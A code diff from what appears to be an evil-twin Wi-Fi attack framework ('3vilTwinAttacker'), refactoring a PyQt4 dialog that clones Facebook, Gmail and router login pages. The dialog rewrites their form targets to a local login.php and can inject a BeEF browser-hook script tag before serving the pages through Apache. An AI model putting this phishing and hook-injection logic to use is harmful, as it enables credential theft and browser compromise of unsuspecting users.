@@ -17,20 +17,20 @@
 from PyQt4.QtGui import *
 from PyQt4.QtCore import *
 from Core.Settings import frm_Settings
-from Modules.utils import ProcessThread,Refactor,Beef_Hook_url
-from os import popen,chdir,getcwd,getuid,devnull
+from Modules.utils import ProcessThread,Beef_Hook_url
+from os import popen,chdir,getcwd
 from urllib2 import urlopen,URLError
 threadloading = {'template':[],'posion':[]}
 class frm_template(QDialog):
     def __init__(self, parent = None):
         super(frm_template, self).__init__(parent)
-        self.label = QLabel()
-        self.Main = QVBoxLayout(self)
+        self.label      = QLabel()
+        self.Main       = QVBoxLayout(self)
+        self.control    = None
+        self.owd        = getcwd()
+        self.config     = frm_Settings()
         self.setGeometry(0, 0, 500, 100)
         self.center()
-        self.control = None
-        self.owd = getcwd()
-        self.config = frm_Settings()
         self.loadtheme(self.config.XmlThemeSelected())
         global threadloading
         self.gui_temp()
@@ -49,21 +49,21 @@ class frm_template(QDialog):
     def gui_temp(self):
         self.frm0 = QFormLayout(self)
         self.frm1 = QFormLayout(self)
-        self.check_face = QCheckBox('Facebook')
-        self.check_gmail = QCheckBox('Gmail')
-        self.check_route = QCheckBox('Router')
-        self.check_beef = QCheckBox('Beef')
-        self.check_custom = QCheckBox('Custom Phishing')
-        self.EditBeef = QLineEdit(self)
+        self.check_face     = QCheckBox('Facebook')
+        self.check_gmail    = QCheckBox('Gmail')
+        self.check_route    = QCheckBox('Router')
+        self.check_beef     = QCheckBox('Beef')
+        self.check_custom   = QCheckBox('Custom Phishing')
+        self.EditBeef       = QLineEdit(self)
+        self.txt_html       = QTextEdit(self)
         self.EditBeef.setEnabled(False)
-
-        self.txt_html = QTextEdit(self)
         self.txt_html.setPlainText('<html>\n<head>\n<title>3vilTwinAttacker Phishing </title>'
         '\n</head>\n<body>\n'
         '\n<h3 align=\'center\'>3vilTwinAttacker Framework</h3>\n'
         '\n<p align=\'center\'>this is demo Attack Redirect.</p>\n'
         '\n</body>\n</html>')
         self.txt_html.setEnabled(False)
+
         # connect buton
         self.check_face.clicked.connect(self.check_options)
         self.check_gmail.clicked.connect(self.check_options)
@@ -83,7 +83,7 @@ class frm_template(QDialog):
         h.setSizePolicy(QSizePolicy.Minimum,QSizePolicy.Expanding)
         self.frm0.addRow(h)
         self.frm0.addRow(self.check_beef)
-        self.frm0.addRow(QLabel('IP Redirect:'),self.txt_redirect)
+        self.frm0.addRow(QLabel('IPAddress:'),self.txt_redirect)
         self.frm0.addRow("Beef Hook URL:",self.EditBeef)
         self.frm0.addRow(self.btn_start_template)
 
@@ -117,6 +117,8 @@ class frm_template(QDialog):
 
     def start_server(self):
         sock = None
+        if len(self.txt_redirect.text()) == 0:
+            return QMessageBox.warning(self,'Error IpAddress','IpAddress not found!')
         if self.check_face.isChecked():
             url = 'http://facebook.com'
             try:
@@ -146,11 +148,11 @@ class frm_template(QDialog):
             i.stop(),i.join()
     def phishing_page(self,choice,sock):
             if choice == 'facebook':
-                path = 'Modules/Phishing/Facebook/'
+                path = 'Templates/Phishing/Facebook/'
                 try:
                     chdir(path)
                 except OSError,e:
-                    return None
+                    return QMessageBox.warning(self,'error path',e)
                 self.html = sock.replace('https://www.facebook.com/login.php?login_attempt=1', 'login.php')
                 if self.check_beef.isChecked() and len(self.EditBeef.text()) != 0:
                     self.hook = '<script type="text/javascript" src="%s"></script>'%self.EditBeef.text()
@@ -163,10 +165,10 @@ class frm_template(QDialog):
                     f.write(str(self.html))
                     f.close()
             elif choice == 'route':
-                path = 'Modules/Phishing/Route/'
+                path = 'Templates/Phishing/Route/'
                 chdir(path)
             elif choice == 'custom':
-                path = 'Modules/Phishing/Custom/'
+                path = 'Templates/Phishing/Custom/'
                 chdir(path)
                 self.html = self.txt_html.toPlainText()
                 if self.check_beef.isChecked() and len(self.EditBeef.text()) != 0:
@@ -180,7 +182,7 @@ class frm_template(QDialog):
                     f.write(str(self.html))
                     f.close()
             elif choice == 'gmail':
-                path = 'Modules/Phishing/Gmail/'
+                path = 'Templates/Phishing/Gmail/'
                 try:
                     chdir(path)
                     request = urlopen('http://accounts.google.com/Login?hl').read()
@@ -197,7 +199,7 @@ class frm_template(QDialog):
                         f.write(str(self.html))
                         f.close()
                 except OSError,e:
-                    return None
+                    return QMessageBox.warning(self,'error path',e)
 
             ip = str(self.txt_redirect.text())
             popen('service apache2 stop')
@@ -207,5 +209,9 @@ class frm_template(QDialog):
                 threadloading['template'].append(Tphishing)
                 Tphishing.start()
                 self.emit(SIGNAL('Activated( QString )'),'started')
-            else:
-                QMessageBox.information(self,'Connection','Ipaddress not found')
+                while True:
+                    if Tphishing.process != None:
+                        chdir(self.owd)
+                        break
+                return
+            QMessageBox.warning(self,'Connection','Ipaddress not found')
